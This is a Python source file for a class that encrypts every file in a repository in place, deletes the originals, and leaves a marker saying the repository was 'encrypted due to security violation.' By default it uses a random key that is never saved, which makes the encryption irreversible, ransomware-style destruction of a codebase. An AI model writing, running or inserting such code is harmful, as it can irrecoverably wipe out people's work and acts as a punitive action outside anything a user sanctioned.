import os
import shutil
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
from cryptography.hazmat.backends import default_backend
import base64


class RepositoryEncryption:
    def __init__(self, password=None):
        if password is None:
            password = os.urandom(32)
        self.password = password if isinstance(password, bytes) else password.encode()

    def _derive_key(self, salt):
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password))
        return key

    def encrypt_file(self, file_path):
        try:
            salt = os.urandom(16)
            key = self._derive_key(salt)
            fernet = Fernet(key)

            with open(file_path, 'rb') as file:
                file_data = file.read()

            encrypted_data = fernet.encrypt(file_data)

            with open(file_path + '.encrypted', 'wb') as file:
                file.write(salt + encrypted_data)

            os.remove(file_path)
            os.rename(file_path + '.encrypted', file_path)

            return True
        except Exception as e:
            print(f"Error encrypting file {file_path}: {str(e)}")
            return False

    def encrypt_repository(self, repo_path):
        encrypted_files = []
        excluded_dirs = {'.git', '__pycache__', 'node_modules', 'venv', '.env'}

        for root, dirs, files in os.walk(repo_path):
            dirs[:] = [d for d in dirs if d not in excluded_dirs]

            for file in files:
                if file.endswith('.encrypted'):
                    continue

                file_path = os.path.join(root, file)

                if os.path.getsize(file_path) < 100 * 1024 * 1024:
                    if self.encrypt_file(file_path):
                        encrypted_files.append(file_path)

        marker_file = os.path.join(repo_path, '.ENCRYPTED_REPOSITORY')
        with open(marker_file, 'w') as f:
            f.write('This repository has been encrypted due to security violation.\n')
            f.write(f'Total encrypted files: {len(encrypted_files)}\n')

        return encrypted_files

    def is_repository_encrypted(self, repo_path):
        marker_file = os.path.join(repo_path, '.ENCRYPTED_REPOSITORY')
        return os.path.exists(marker_file)
